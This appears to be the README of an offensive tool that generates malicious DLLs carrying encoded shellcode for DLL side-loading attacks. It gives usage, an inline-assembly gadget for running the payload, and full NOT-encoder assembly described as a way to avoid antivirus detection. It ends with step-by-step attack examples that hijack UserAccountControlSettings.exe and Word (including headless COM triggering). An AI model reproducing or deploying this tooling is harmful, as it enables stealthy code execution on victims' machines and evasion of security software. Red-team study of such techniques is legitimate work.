# MaliciousDLLGenerator

DLL Generator for side loading attack

### Currently only support 64 bits shellcode

# Usage

```
$ python gen-dll.py -h

MaliciousDLLGenerator - Mr.Un1k0d3r - RingZer0 Team
---------------------------------------------------


[-] Shellcode size is limited to 1024 bytes
usage: gen-dll.py [-h] -o OUTPUT -s SHELLCODE [-t TYPE]

optional arguments:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        Output filename
  -s SHELLCODE, --shellcode SHELLCODE
                        Raw shellcode file path
  -t TYPE, --type TYPE  DLL type (default,oart)
```

# Shellcode gadget

Instead of using the standard shellcode calling structure

```
char shellcode[] = {};
int(*execute)(void);
execute = (int(*)())shellcode;
execute();
```

Which result in the following assembly code

```
call rax
```

The DLL is mimicking a standard function return by using the following code

```
        CHAR payload[] = "";
        asm volatile ("mov %%rax, %0\n\t"
                     "push %%rax\n\t"
                     "ret"
                     :
                     : "r" (payload));
```

Which result in following assembly code

```
mov rax, rsp
push rax
ret
```

# Compiling from source using GCC

```
C:\> x86_64-w64-mingw32-g++.exe -Wall -DBUILD_DLL -O2 -c maindll.cpp -o maindll.o
C:\> x86_64-w64-mingw32-g++.exe -shared -Wl,--dll maindll.o -o yourdll.dll -s 
```

# Compiling from ASM

64 bits

```
$ nasm -felf64 encoder-64.asm -o encoder-64.o
$ ld -N encoder-64.o -o encoder-64
```

32 bits

```
$ nasm -felf32 encoder-32.asm -o encoder-32.o
$ ld -N -melf_i386 encoder-32.o -o encoder-32
```

# Obfuscation shellcode

The DLL encode the shellcode using a simple NOT encoder to avoid AV detection.

# 64 bits NOT encoder source

```
_start:
        call $ + 5
        pop rbx
        xor rax, rax
        mov rcx, rax
        mov cl, 128
        add rbx, 16
_loop:
        not QWORD [rbx + rcx * 8]
        loop _loop
        add rbx, 8
        push rbx
        ret
```

# 32 bits NOT encoder source

```
_start:
        call $ + 5
        pop ebx
        xor eax, eax
        mov ecx, eax
        mov cx, 256
        add ebx, 18
_loop:
        not DWORD [ebx + ecx * 4]
        loop _loop
        add ebx, 4
        push ebx
        ret
```

# Attack examples

Using windows binaries

```
copy C:\windows\system32\UserAccountControlSettings.exe to a writable location
add the malicious dll in the same folder and rename it to cryptbase.dll
```

```
copy C:\Program Files (x86)\Microsoft Office\root\Office16\winword.exe to a writable location
add the malicious dll (use the oart switch) in the same folder and rename it to oart.dll

it can be trigged remotely using COM object. Winword can be started without GUI using the following command:
C:\yourpath\winword.exe /Automation -Embedding
```

# Credit
Mr.Un1k0d3r RingZer0 Team
